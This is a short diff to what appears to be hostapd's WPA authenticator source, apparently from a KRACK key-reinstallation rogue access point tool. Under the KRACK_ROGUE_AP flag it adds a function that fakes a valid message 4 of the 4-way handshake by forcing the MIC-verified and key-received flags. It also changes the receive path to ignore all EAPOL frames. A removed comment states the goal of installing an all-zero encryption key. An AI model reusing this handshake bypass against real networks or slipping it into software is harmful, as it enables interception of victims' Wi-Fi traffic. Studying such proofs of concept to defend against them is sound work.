@@ -891,6 +891,23 @@ static int wpa_try_alt_snonce(struct wpa_state_machine *sm, u8 *data,
 }
 
 
+#ifdef KRACK_ROGUE_AP
+void wpa_receive_msg4(struct wpa_authenticator *wpa_auth, struct wpa_state_machine *sm)
+{
+	printf(">>> %s: faking valid msg4 EAPOL frame\n", __FUNCTION__);
+	sm->wpa_ptk_state = WPA_PTK_PTKINITNEGOTIATING;
+	sm->MICVerified = 1;
+
+	sm->rx_eapol_key_secure = 1;
+	sm->EAPOLKeyReceived = TRUE;
+	sm->EAPOLKeyPairwise = TRUE;
+	sm->EAPOLKeyRequest = FALSE;
+	wpa_sm_step(sm);
+	return;
+}
+#endif
+
+
 void wpa_receive(struct wpa_authenticator *wpa_auth,
 		 struct wpa_state_machine *sm,
 		 u8 *data, size_t data_len)
@@ -1002,21 +1019,7 @@ void wpa_receive(struct wpa_authenticator *wpa_auth,
 	}
 
 #ifdef KRACK_ROGUE_AP
-	// We just wait for Msg 4/4 and then install an all-zero TK
-	if (msg != PAIRWISE_4) {
-		printf(">>> %s: Igning non-msg4 EAPOL frame\n", __FUNCTION__);
-		return;
-	}
-
-	printf(">>> %s: treating as valid msg4 EAPOL frame\n", __FUNCTION__);
-	sm->wpa_ptk_state = WPA_PTK_PTKINITNEGOTIATING;
-	sm->MICVerified = 1;
-
-	sm->rx_eapol_key_secure = 1;
-	sm->EAPOLKeyReceived = TRUE;
-	sm->EAPOLKeyPairwise = TRUE;
-	sm->EAPOLKeyRequest = FALSE;
-	wpa_sm_step(sm);
+	printf(">>> %s: Igning all EAPOL frames\n", __FUNCTION__);
 	return;
 #endif
 
